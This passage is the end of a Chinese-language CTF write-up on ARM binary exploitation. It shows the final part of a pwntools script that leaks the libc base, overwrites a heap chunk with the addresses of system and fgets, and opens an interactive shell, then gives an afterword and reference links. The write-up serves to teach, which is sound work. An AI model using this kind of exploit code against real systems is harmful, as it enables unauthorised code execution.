    success('We get libc base address is ' + str(hex(libc_base)))
    sh.recvuntil(': ')
    sh.sendline('edit' + ' ' + 'Chunk__1')
    sh.recvuntil('Team: ')
    sh.sendline('Chunk__1')
    sh.recvuntil('Desc: ')
    sh.sendline(p32(libc_base + libc.symbols['system']) + p32(libc_base + libc.symbols['fgets']))
    sh.recvuntil('Points: ')
    sh.sendline(str(1))
    delete(sh,3)
    sh.interactive()
    flag=get_flag(sh)
    log.success('The flag is '+flag)
```



## 0x05 后记

可以看出，ARM架构下的pwn利用大多数还是利用了Intel32/AMD64架构下的利用思想，只要理解并掌握了ARM架构指令集的变化，利用还是相对容易的，此处的题目没有展示更深的利用技巧(例如：栈喷射、堆喷射、条件竞争等)，这些技巧可能会在我的下一篇文章中给与展示，同时接下来我将会去尝试总结MIPS架构下的PWN利用技巧~



## 0x06 参考链接

[arm64程序调用规则 – maniac_kk](https://juejin.im/post/5d14623ef265da1bb47d7635)

[如何 pwn 掉一个 arm 的binary – m4x](https://m4x.fun/post/how-2-pwn-an-arm-binary/)

[ARM汇编指令-STMFD和LDMFD – 行走的红茶](https://blog.csdn.net/weiwei_xiaoyu/article/details/20563479)

[ARM汇编编程规则 – Arrow](https://blog.csdn.net/MyArrow/article/details/9665513)

[ARMv8-AArch64寄存器和指令集](https://blog.csdn.net/tanli20090506/article/details/71487570)

[ARM栈溢出攻击实践：从虚拟环境搭建到ROP利用](https://www.freebuf.com/articles/terminal/107276.html)

[Mac下安装qemu并模拟树莓派操作系统 – gogogogo彬](https://blog.csdn.net/qq_40640958/article/details/89048551)

[Rootme CTF UAF Writeup](https://www.ms509.com/2018/03/23/Rootme-uaf-writeup/)
